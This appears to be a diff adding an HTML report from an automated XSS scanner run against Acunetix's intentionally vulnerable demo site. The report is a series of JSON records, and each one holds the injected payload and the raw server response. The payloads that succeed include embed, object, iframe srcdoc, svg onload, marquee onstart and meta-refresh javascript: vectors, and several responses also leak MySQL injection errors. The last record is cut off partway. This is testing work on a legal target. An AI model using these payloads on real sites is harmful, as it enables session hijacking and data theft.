@@ -1,0 +1,890 @@
+<html><body>
+<h1>Report 1761587131</h1>
+<pre>
+{
+  "timestamp": 13246,
+  "url": "http://testphp.vulnweb.com/search.php?test=query",
+  "marker": "XSS_MARKER_1761587095_3296",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587095_3296"
+  },
+  "meta": {
+    "type": "FORM",
+    "url": "http://testphp.vulnweb.com",
+    "method": "POST",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "form_fields": {
+      "searchFor": "",
+      "goButton": "go"
+    },
+    "tested_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id='pageName'>searched for: <embed src=javascript:alert('XSS_MARKER_1761587095_3296')></h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')>', a.title) > 0 OR LOCATE('<embed src=javascript:alert('XSS_MARKER_1761587095' at line 3"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13247,
+  "url": "http://testphp.vulnweb.com/search.php?test=query",
+  "marker": "XSS_MARKER_1761587097_5719",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587097_5719"
+  },
+  "meta": {
+    "type": "FORM",
+    "url": "http://testphp.vulnweb.com/categories.php",
+    "method": "POST",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "form_fields": {
+      "searchFor": "",
+      "goButton": "go"
+    },
+    "tested_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id='pageName'>searched for: <object data=javascript:alert('XSS_MARKER_1761587097_5719')></h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')>', a.title) > 0 OR LOCATE('<object data=javascript:alert('XSS_MARKER_17615870' at line 3"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13248,
+  "url": "http://testphp.vulnweb.com/search.php?test=query",
+  "marker": "XSS_MARKER_1761587098_2135",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587098_2135"
+  },
+  "meta": {
+    "type": "FORM",
+    "url": "http://testphp.vulnweb.com/artists.php",
+    "method": "POST",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "form_fields": {
+      "searchFor": "",
+      "goButton": "go"
+    },
+    "tested_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id='pageName'>searched for: javascript:/*--></title></style></textarea></script>alert('XSS_MARKER_1761587098_2135')</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')', a.title) > 0 OR LOCATE('javascript:/*--></title></style></textarea></script' at line 3"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13249,
+  "url": "http://testphp.vulnweb.com/search.php?test=query",
+  "marker": "XSS_MARKER_1761587099_4730",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587099_4730"
+  },
+  "meta": {
+    "type": "FORM",
+    "url": "http://testphp.vulnweb.com/disclaimer.php",
+    "method": "POST",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "form_fields": {
+      "searchFor": "",
+      "goButton": "go"
+    },
+    "tested_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id='pageName'>searched for: <iframe srcdoc='<img src=x onerror=alert(`XSS_MARKER_1761587099_4730`)>'></h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '=x onerror=alert(`XSS_MARKER_1761587099_4730`)>'>', a.title) > 0 OR LOCATE('<ifr' at line 3"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13250,
+  "url": "http://testphp.vulnweb.com/guestbook.php",
+  "marker": "XSS_MARKER_1761587100_2263",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587100_2263"
+  },
+  "meta": {
+    "type": "FORM",
+    "url": "http://testphp.vulnweb.com/guestbook.php",
+    "method": "POST",
+    "action": "http://testphp.vulnweb.com/guestbook.php",
+    "param": "name",
+    "form_fields": {
+      "name": "anonymous user",
+      "text": "",
+      "submit": "add message"
+    },
+    "tested_url": "http://testphp.vulnweb.com/guestbook.php",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>guestbook</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<div class=\"story\">\n\t<table width=\"100%\" cellpadding=\"4\" cellspacing=\"1\"><tr><td colspan=\"2\"><h2>Our guestbook</h2></td></tr><tr><td align=\"left\" valign=\"middle\" style=\"background-color:#F5F5F5\"><strong><marquee onstart=alert('XSS_MARKER_1761587100_2263')></strong></td><td align=\"right\" style=\"background-color:#F5F5F5\">10.27.2025, 5:44 pm</td></tr><tr><td colspan=\"2\"><img src=\"/images/remark.gif\">&nbsp;&nbsp;</td></tr></table>\t </div>\n\t  <div class=\"story\">\n\t  \t<form action=\"\" method=\"post\" name=\"faddentry\">\n\t\t\t<input type=\"hidden\" name=\"name\" value=\"anonymous user\">\n\t\t\t<textarea name=\"text\" rows=\"5\" wrap=\"VIRTUAL\" style=\"width:500px;\"></textarea>\n\t\t\t<br>\n\t\t\t<input type=\"submit\" name=\"submit\" value=\"add message\">\n\t\t</form>\n\t  </div>\n</div>\n<!-- InstanceEndEditable -->\n<!--end content -->\n\n<div id=\"navBar\"> \n  <div id=\"search\"> \n    <form action=\"search.php?test=query\" method=\"post\"> \n      <label>search art</label> \n      <input name=\"searchFor\" type=\"text\" size=\"10\"> \n      <input name=\"goButton\" type=\"submit\" value=\"go\"> \n    </form> \n  </div> \n  <div id=\"sectionLinks\"> \n    <ul> \n      <li><a href=\"categories.php\">Browse categories</a></li> \n      <li><a href=\"artists.php\">Browse artists</a></li> \n      <li><a href=\"cart.php\">Your cart</a></li> \n      <li><a href=\"login.php\">Signup</a></li>\n\t  <li><a href=\"userinfo.php\">Your profile</a></li>\n\t  <li><a href=\"guestbook.php\">Our guestbook</a></li>\n\t\t<li><a href=\"AJAX/index.php\">AJAX Demo</a></li>\n\t  </li> \n    </ul> \n  </div> \n  <div class=\"relatedLinks\"> \n    <h3>Links</h3> \n    <ul> \n      <li><a href=\"http://www.acunetix.com\">Security art</a></li> \n\t  <li><a href=\"https://www.acunetix.com/vulnerability-scanner/php-security-scanner/\">PHP scanner</a></li>\n\t  <li><a href=\"https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/\">PHP vuln help</a></li>\n\t  <li><a href=\"http://www.eclectasy.com/Fractal-Explorer/index.html\">Fractal Explorer</a></li> \n    </ul> \n  </div> \n  <div id=\"advert\"> \n    <p>\n      <object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0\" width=\"107\" height=\"66\">\n        <param name=\"movie\" value=\"Flash/add.swf\">\n        <param name=quality value=high>\n        <embed src=\"Flash/add.swf\" quality=high pluginspage=\"http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash\" type=\"application/x-shockwave-flash\" width=\"107\" height=\"66\"></embed>\n      </object>\n    </p>\n  </div> \n</div> \n\n<!--end navbar --> \n<div id=\"siteInfo\">  <a href=\"http://www.acunetix.com\">About Us</a> | <a href=\"privacy.php\">Privacy Policy</a> | <a href=\"mailto:wvs@acunetix.com\">Contact Us</a> | &copy;2019\n  Acunetix Ltd \n</div> \n<br> \n<div style=\"background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px\">\n<p style=\"padding-left:5%;padding-right:5%\"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>\n</div>\n</div>\n</body>\n<!-- InstanceEnd --></html>\n"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13250,
+  "url": "http://testphp.vulnweb.com/guestbook.php",
+  "marker": "XSS_MARKER_1761587100_3030",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587100_3030"
+  },
+  "meta": {
+    "type": "FORM",
+    "url": "http://testphp.vulnweb.com/guestbook.php",
+    "method": "POST",
+    "action": "http://testphp.vulnweb.com/guestbook.php",
+    "param": "text",
+    "form_fields": {
+      "name": "anonymous user",
+      "text": "",
+      "submit": "add message"
+    },
+    "tested_url": "http://testphp.vulnweb.com/guestbook.php",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>guestbook</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<div class=\"story\">\n\t<table width=\"100%\" cellpadding=\"4\" cellspacing=\"1\"><tr><td colspan=\"2\"><h2>Our guestbook</h2></td></tr><tr><td align=\"left\" valign=\"middle\" style=\"background-color:#F5F5F5\"><strong>anonymous user</strong></td><td align=\"right\" style=\"background-color:#F5F5F5\">10.27.2025, 5:45 pm</td></tr><tr><td colspan=\"2\"><img src=\"/images/remark.gif\">&nbsp;&nbsp;<svg/onload=alert&lpar;'XSS_MARKER_1761587100_3030'&rpar;//</td></tr></table>\t </div>\n\t  <div class=\"story\">\n\t  \t<form action=\"\" method=\"post\" name=\"faddentry\">\n\t\t\t<input type=\"hidden\" name=\"name\" value=\"anonymous user\">\n\t\t\t<textarea name=\"text\" rows=\"5\" wrap=\"VIRTUAL\" style=\"width:500px;\"></textarea>\n\t\t\t<br>\n\t\t\t<input type=\"submit\" name=\"submit\" value=\"add message\">\n\t\t</form>\n\t  </div>\n</div>\n<!-- InstanceEndEditable -->\n<!--end content -->\n\n<div id=\"navBar\"> \n  <div id=\"search\"> \n    <form action=\"search.php?test=query\" method=\"post\"> \n      <label>search art</label> \n      <input name=\"searchFor\" type=\"text\" size=\"10\"> \n      <input name=\"goButton\" type=\"submit\" value=\"go\"> \n    </form> \n  </div> \n  <div id=\"sectionLinks\"> \n    <ul> \n      <li><a href=\"categories.php\">Browse categories</a></li> \n      <li><a href=\"artists.php\">Browse artists</a></li> \n      <li><a href=\"cart.php\">Your cart</a></li> \n      <li><a href=\"login.php\">Signup</a></li>\n\t  <li><a href=\"userinfo.php\">Your profile</a></li>\n\t  <li><a href=\"guestbook.php\">Our guestbook</a></li>\n\t\t<li><a href=\"AJAX/index.php\">AJAX Demo</a></li>\n\t  </li> \n    </ul> \n  </div> \n  <div class=\"relatedLinks\"> \n    <h3>Links</h3> \n    <ul> \n      <li><a href=\"http://www.acunetix.com\">Security art</a></li> \n\t  <li><a href=\"https://www.acunetix.com/vulnerability-scanner/php-security-scanner/\">PHP scanner</a></li>\n\t  <li><a href=\"https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/\">PHP vuln help</a></li>\n\t  <li><a href=\"http://www.eclectasy.com/Fractal-Explorer/index.html\">Fractal Explorer</a></li> \n    </ul> \n  </div> \n  <div id=\"advert\"> \n    <p>\n      <object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0\" width=\"107\" height=\"66\">\n        <param name=\"movie\" value=\"Flash/add.swf\">\n        <param name=quality value=high>\n        <embed src=\"Flash/add.swf\" quality=high pluginspage=\"http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash\" type=\"application/x-shockwave-flash\" width=\"107\" height=\"66\"></embed>\n      </object>\n    </p>\n  </div> \n</div> \n\n<!--end navbar --> \n<div id=\"siteInfo\">  <a href=\"http://www.acunetix.com\">About Us</a> | <a href=\"privacy.php\">Privacy Policy</a> | <a href=\"mailto:wvs@acunetix.com\">Contact Us</a> | &copy;2019\n  Acunetix Ltd \n</div> \n<br> \n<div style=\"background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px\">\n<p style=\"padding-left:5%;padding-right:5%\"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>\n</div>\n</div>\n</body>\n<!-- InstanceEnd --></html>\n"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13251,
+  "url": "http://testphp.vulnweb.com/userinfo.php",
+  "marker": "XSS_MARKER_1761587101_8278",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587101_8278"
+  },
+  "meta": {
+    "type": "FORM",
+    "url": "http://testphp.vulnweb.com/login.php",
+    "method": "POST",
+    "action": "http://testphp.vulnweb.com/userinfo.php",
+    "param": "uname",
+    "form_fields": {
+      "uname": "",
+      "pass": ""
+    },
+    "tested_url": "http://testphp.vulnweb.com/userinfo.php",
+    "response_text": "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'XSS_MARKER_1761587101_8278') attributename=x to=0>' AND pass=''' at line 1"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13251,
+  "url": "http://testphp.vulnweb.com/userinfo.php",
+  "marker": "XSS_MARKER_1761587102_3237",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587102_3237"
+  },
+  "meta": {
+    "type": "FORM",
+    "url": "http://testphp.vulnweb.com/login.php",
+    "method": "POST",
+    "action": "http://testphp.vulnweb.com/userinfo.php",
+    "param": "pass",
+    "form_fields": {
+      "uname": "",
+      "pass": ""
+    },
+    "tested_url": "http://testphp.vulnweb.com/userinfo.php",
+    "response_text": "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'refresh' content='0;url=javascript:alert(\"XSS_MARKER_1761587102_3237\")'>'' at line 1"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13252,
+  "url": "http://testphp.vulnweb.com/userinfo.php",
+  "marker": "XSS_MARKER_1761587102_4624",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587102_4624"
+  },
+  "meta": {
+    "type": "FORM",
+    "url": "http://testphp.vulnweb.com/userinfo.php",
+    "method": "POST",
+    "action": "http://testphp.vulnweb.com/userinfo.php",
+    "param": "uname",
+    "form_fields": {
+      "uname": "",
+      "pass": ""
+    },
+    "tested_url": "http://testphp.vulnweb.com/userinfo.php",
+    "response_text": "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'XSS_MARKER_1761587102_4624')>' AND pass=''' at line 1"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13254,
+  "url": "http://testphp.vulnweb.com/listproducts.php?cat=%22%3E%3Cscript%3Ealert%28%27XSS_MARKER_1761587104_7993%27%29%3C%2Fscript%3E",
+  "marker": "XSS_MARKER_1761587104_7993",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587104_7993"
+  },
+  "meta": {
+    "type": "GET",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+    "param": "cat",
+    "params": {
+      "cat": "1"
+    },
+    "tested_url": "http://testphp.vulnweb.com/listproducts.php?cat=%22%3E%3Cscript%3Ealert%28%27XSS_MARKER_1761587104_7993%27%29%3C%2Fscript%3E",
